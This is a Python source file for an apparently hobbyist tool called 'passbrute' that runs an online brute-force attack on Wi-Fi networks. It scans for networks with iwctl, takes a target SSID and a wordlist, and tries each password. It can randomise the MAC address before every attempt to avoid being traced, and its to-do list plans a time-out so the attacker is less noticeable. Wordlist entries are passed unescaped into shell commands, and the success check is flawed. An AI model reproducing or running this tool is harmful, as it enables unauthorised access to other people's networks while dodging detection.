import os
import typer
import time
import rich
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn, SpinnerColumn


app = typer.Typer()


def passbrute():

    # Make mac changing simpler, using the macchanger thing from yay (pacman)
    class mac:
        def rand():  # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")
            time.sleep(0.001)
            time.sleep(0.001)
            os.system("sudo macchanger -r wlan0")
            time.sleep(0.001)
            time.sleep(0.001)
            os.system("sudo ip link set wlan0 up")
        
        def perm(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")
            time.sleep(0.001)
            os.system("sudo macchanger -p wlan0")
            time.sleep(0.001)
            os.system("sudo ip link set wlan0 up")   
        
        def check(): # pyright: ignore[reportSelfClsParameterName]
            os.system("macchanger --show wlan0")

    class net:
        def down(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")

        def up(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 up")


    typer.echo("Running in passbrute mode...")
    
    time.sleep(1)

    net.down() # pyright: ignore[reportAttributeAccessIssue]
    mac_change_preference = input("Do you want to change your MAC address? (y/n): ").strip()
    mac_change_preference_bool = False

    time.sleep(1)

    if mac_change_preference.lower() == 'y':
        typer.echo("MAC address will change every attempt...")
        mac.rand() # pyright: ignore[reportAttributeAccessIssue]
        mac_change_preference_bool = True
        typer.echo("Successfully changed MAC address!")
    
    time.sleep(1)
    
    mac.check() #    pyright: ignore[reportAttributeAccessIssue]
    input("Just in-case, double-check your MAC address. Press any key to continue, ^C to abort...")
    time.sleep(1)

    typer.echo("Wait.")
    
    time.sleep(1)

    os.system("iwctl station wlan0 scan")

    # Pretend there's a loading thing here via rich
    typer.echo("Wait.")
    time.sleep(3)
    
    os.system("iwctl station wlan0 get-networks")

    target_ssid = input("Type target SSID: ")
    time.sleep(1)
    print("Type path to word list (none will do random from minimum 8 characters): ")
    wordlist_path = input("Path (can be stored in src/modules/passbrute/word_lists/): ").strip()
    # Python is very picky with paths, need a way to make it better
    

    with open(wordlist_path, 'r', encoding="utf-8") as f:
        passwlist = [line.strip() for line in f]
        # Make this remove empty lines and spaces, also make |>> text<<| a comment in the wordlist file so that you can add comments to the wordlist file and it will ignore them.
        passwlist = [line.strip() for line in passwlist if line.strip() and not (line.startswith("|>> ") and line.endswith(" <<|"))]

    if not wordlist_path:
        typer.echo("Using default brute force ")
        time.sleep(1)
        use_def_brute = True

    passw = ""

    if wordlist_path:
        for i in passwlist:
            if mac_change_preference_bool:
                mac.rand() # pyright: ignore[reportAttributeAccessIssue]
            os.system(f"iwctl station wlan0 connect {target_ssid} password {i}")
            
            
            connected_check = os.popen(f"iwctl station wlan0 show")
            connected_check_output = connected_check.read()

            # Check if 'connected' is in the text
            if "connected" in connected_check_output.lower():
                # Need to make it more obvious that the password is correct
                print("✅ Crakd! Password is: " + i)
                passw = i
                break
            else:
                print("❌ No! Tried password: " + i)
    
    print(passw)

    # Return to original MAC address
    mac.perm() # pyright: ignore[reportAttributeAccessIssue]
    # Use successfully cracked password to connect to the network
    os.system(f"iwctl station wlan0 connect {target_ssid} password {passw} ")
    
    """
        TO-DO LIST
        - Make the word list mode
        - Make random mode (min 8 char)
        - Make time-out -> The longer you're there, the more obvious you are
        - Don't use -r on macchanger and make them even more random
        - Polish
        - Add error checking
        - Make it more interactive
        
        Should be working by W9 but not close to polished
    """
